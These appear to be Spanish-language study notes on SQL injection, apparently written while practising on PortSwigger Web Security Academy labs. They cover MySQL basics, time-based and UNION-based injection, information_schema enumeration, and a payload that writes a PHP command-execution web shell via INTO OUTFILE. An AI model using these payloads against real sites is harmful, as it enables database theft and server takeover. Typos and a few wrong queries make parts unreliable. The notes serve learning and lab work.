Cuando te logueas en la web por detrás viaja una [[query]] QUE COMUNICA CON UNA BASE DE DATOS, CONSULTANDO SI LOS DATOS QUE INREGASTE SON CORRECTOS
Usamosel siguiente comando para saber si es vulnerable a un sql injection
```
https://elmejorlinkdealahistoria/parecefalse?id=1' and sleep(5)-- -
```
pirmero ejecutamos el siuguiente comando, para acceder al servicio y poder entrar a la base de datos y proporcionanr una contraseña con "-p"
```
mysql -uroot -p
```
en cuanto a la estructura respecta, hay columnas, hay tablas, hay base de datos y hay información, para ver la base da datos utilizamos el camndo:
```
show databases;
```
cada columna tiene datos que puede ser vistos, para usar esta tabla de bases y poder operar desde la misma: 
```
use mysql;
```
ahora si buscamos las tablas, se listarán las de mysql:
```
show tables;
```
y para ver en profundidad uno de los datos, por ejempo el DATO llamado USER
```
describe user;
```
Ahora si alguno de los datos de la tabla de bases me interesa:
```
select user ,password from user;
```
ahora si queremos acotar la búsqueda usamo where, el nombre del dato de la tabla correspondiente e igual a un usuario como root por ejemplo, where user = 'root'
tal que así:
```
select usr ,password from user where user = 'root'
```
## Creación de base de datos
vamos a crear una base de datos
```
create database Marx;
```
tenemos una nueva database y entramos a la tabla recién creada:
```
use Marx
```

y como si listamos las tablas no hay ninguna, entonces vamos a crear una
```
create table users();
```
Le asignamos los campos, columnas, un ejemplo de esto sería el siguiente:
```
create table users(id, username, password, subscription);
```
 ponemos el comando create table, el nombre de la tabla que le vamos añadir y dentro del paréntesis indicas las columnas que va a tener, por ejemplo en la columna "Type" un numero entero que va corresponder a la credencial del usuario (un id) y varchar es la cantidad de caracteres admitidos 
```
create table users(id int auto_increment PRIMARY KEY, username varchar(32), password varchar(32), subscription varchar(32));
```
para eliminar una tabla ejecutamos el siguietne comando 
```
drop table users;
```
Ya una vez tengamos la tabla terminada podemnos verla con:
```
show tables;
```
y para que las columnas y en mayor detalle utilizamos lo siquiente:
```
describe users;
```
Si uno te da conflicto porque no te deja podrías ponerle el valor en NULL

y ahora insertamos los datos que queremos, los inyectamos:
```
insert into users(id, username, password) values(1, 'admin', 'admin123$!p@$$' );
```
Vemo que tal con los datos inyectados de la siguiewtne forma
```
select * from users;
```
para ver los datos sería algo así:
```
select id,username,password,subscription from users;
```

Y di queremos ver una fila sola, tomamos de referencia la columna llamada 'username', además nos mostrará solo la contraseña y la subscripción
Para ir seleccionando:
```
select password,subscription from users where username = 'admin' order by 1;-- -';
```
ósea que la sintazys sería algo así:
```sql
select (query type) password (column) from (desde) users (la tabla) where (donde está) username 
```
para convinar con los datos que te represente, en este caso 1 y 2 si serían 4 columnas pondrías 1,2,3,4 pero como son dos pones 1,2, de igual forma no hace falta que este en orden, podría ser 2,1 o también puede ser lisa y llanamente NULL,NULL 
```
select password,subscription from users where username = 'admin' union select 1,2;-- -';
```
pero si pone más interesante si empezamos a inyectar comandos SQL
```
select password,subscription from users where username = 'admin' union select version(),database();-- -';
```
para un ejemplo de url de una página agragariamos algo así al link:
```
/filter?category=Pets' union select NULL,NULL,NULL-- -
```
no quedaría algo así la urlo 
```
https://0ad90062043bb8ea82b6b52300430081.web-security-academy.net/filter?category=Pets%27%20union%20select%20NULL,NULL,NULL--%20-
```
Y en caso de que quisiera ir más allá e inyectar comandos del SQL,
en el que la union enlaza un comando php y el into outfile hace que lo interprete
```
select password,subscription from users where username = 'admin' union select "<?php system('whoami'); ?>","probando" into outfile "/tmp/prueba.txt";-- -';
```
Si quiero ver la otras bases de datos, le agrego un " schema_name from information_schema.schemata " o utilizamos un group_concat para que nos la concatene
```
select password,subscription from users where username = 'admin' union select 1,group_concat(schema_name) from information_schema.schemata;-- -';
```
ahora si estoy teniendo problemas, también puede ir de uno en uno con un limit 1,1 limit 2,1 limit 3,1
```
select password,subscription from users where username = 'admin' union select 1,schema_name from information_schema.schemata limit 2,1;-- -';
```

```
select password,subscription from users where username = 'admin' union select column_name,2 from information_schema.schemata where table_schema='marx' and table_name='users';-- -';
```
```
union slect NULL,table_name from information_schema.tables where table_schema='public
```
El order by 1 tiene que ser igual a la cantidad de filas de la tabla
```
select username,password from users where id = '2' order by 2;#';
```
Otra forma 


```
select username from users where id = '2' order by 1;#';
```
Las Boolean-based blind SQL Injection es cuando definimos una query según un valor, y de esta forma nos daría un bolean, true or false, o en este caso un 1 o 0
